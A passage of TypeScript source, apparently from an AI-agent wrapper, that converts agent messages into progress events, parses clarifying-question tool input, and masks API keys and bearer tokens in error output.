      // maintain an in-flight Map keyed by id (used to snapshot active
      // tools when a wedge fires — see TaskToolWedgedEvent.activeTools).
      const toolUseIds = toolCalls.map(b => (b.id ?? "") as string);
      return {
        type: "tool_call",
        detail: `Calling: ${toolNames.join(", ")}`,
        timestamp: now,
        meta: {
          tools: toolNames,
          count: toolCalls.length,
          inputs: inputPreviews,
          toolUseIds,
        },
      };
    }

    if (textBlocks.length > 0) {
      const text = textBlocks.map(b => b.text ?? "").join(" ").slice(0, 120);
      return { type: "model_response", detail: text, timestamp: now };
    }
  }

  if (msg.type === "tool_progress") {
    const tp = msg as AgentToolProgressMessage;
    return {
      type: "tool_progress",
      detail: `${tp.tool_name}: ${tp.elapsed_time_seconds.toFixed(1)}s elapsed`,
      timestamp: now,
      meta: { toolName: tp.tool_name, toolUseId: tp.tool_use_id, elapsedSeconds: tp.elapsed_time_seconds },
    };
  }

  if (msg.type === "tool_use_summary") {
    const ts = msg as AgentToolUseSummaryMessage;
    return { type: "tool_summary", detail: ts.summary, timestamp: now };
  }

  return null;
}

/** Parse raw AskUserQuestion input into typed ClarifyingQuestion array. */
function parseQuestions(toolInput: Record<string, unknown>): ClarifyingQuestion[] {
  const rawQuestions = (toolInput.questions ?? []) as Array<Record<string, unknown>>;
  return rawQuestions.map((q) => ({
    question: String(q.question ?? ""),
    header: String(q.header ?? ""),
    options: (q.options ?? []) as Array<{ label: string; description: string }>,
    multiSelect: !!q.multiSelect,
  }));
}

/** Strip potential API keys and tokens from error output. */
function redactSecrets(text: string): string {
  return text
    .replace(/sk-ant-[a-zA-Z0-9_-]+/g, "sk-ant-***")
    .replace(/sk-[a-zA-Z0-9_-]{20,}/g, "sk-***")
    .replace(/key[=: ]+["']?[a-zA-Z0-9_-]{20,}["']?/gi, "key=***")
    .replace(/(Bearer\s+)[A-Za-z0-9_.~+/-]{20,}/gi, "$1***")
    .replace(/(x-api-key[=: ]+["']?)[A-Za-z0-9_-]{20,}/gi, "$1***");
}
